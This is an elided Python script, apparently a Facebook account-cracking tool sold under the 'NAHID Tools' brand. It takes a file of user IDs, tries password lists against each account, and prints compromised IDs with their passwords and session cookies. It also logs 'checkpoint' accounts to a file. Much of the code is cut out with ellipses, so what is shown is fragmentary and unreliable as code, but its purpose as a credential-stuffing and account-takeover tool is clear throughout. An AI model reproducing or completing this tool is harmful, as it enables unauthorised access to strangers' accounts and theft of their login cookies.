#Write By 𝐌𝐑.𝐁𝐎𝐒𝐒 ALAMGIR HOSEN
import os 
...
while attemps < 12345677901:
    ...
    if username == 'NAHID' and password == 'Hasan':
...
os.system('espeak -a 300 " Welcome,   to,  NAHID  Tools"')
os.system('xdg-open https://www.facebook.com/Normal.User.Alamgir')
def banner():
	os.system("clear")
	print("""
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[1;91m\033[1;41m\033[1;97m              WELCOME TO NAHID TOOLS                 \033[;0m\033[1;91m\033[1;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝

\x1b[1;96m╰─╮ƝᎪᎻᏆᎠ╭─╯
         \033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS NAHID BRAND\033[;0m\033[1;91m═══>\033[1;92m
\x1b[38;5;196m╔━━━━━━━━━━━━━━━━━━━━━━━━╦━━━━━━━━━━━━━━━━━━━━━━╗
\x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝐍𝐀𝐌𝐄𓆩💜𓆪          \x1b[38;5;196m║ \x1b[1;96m𓆩╰─╮ƝᎪᎻᏆᎠ╭─╯𓆪       \x1b[38;5;196m║
\x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊𓆩💜𓆪      \x1b[38;5;196m║ \x1b[1;96m𓆩╰─╮ƝᎪᎻᏆᎠ╭─╯𓆪       \x1b[38;5;196m║
\x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝐅𝐑𝐎𝐌𓆩💜𓆪          \x1b[38;5;196m║ \x1b[1;96m𓆩𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇𓆪         \x1b[38;5;196m║
\x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌𓆩💜𓆪      \x1b[38;5;196m║ \x1b[1;96m𓆩╰─╮ƝᎪᎻᏆᎠ╭─╯𓆪       \x1b[38;5;196m║
...
def crack_file():
	...
	print('\033[1;32m[ Put File Example:  /sdcard/nahid.txt  Etc...]')
...
def setting():
	...
	if hu in ['1','01']:
		...
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m LOGIN DONE\n\x1b[1;97m [1] METHOD [Fast Speed Use Data] ')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
def passwrd():
	...
	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTURN ON/OFF NAHID Tools BIMAN MODE IN EVERY 5 MIN")
	Tamimj(f'\033[0;97m===============================================')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#Tamim-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•NAHID-Cp] {idf} • {pw}')     
			  ...
			  #  open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
				...
				#Tamim-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•NAHID-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;95m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " NAHID,  Ok,  id"')
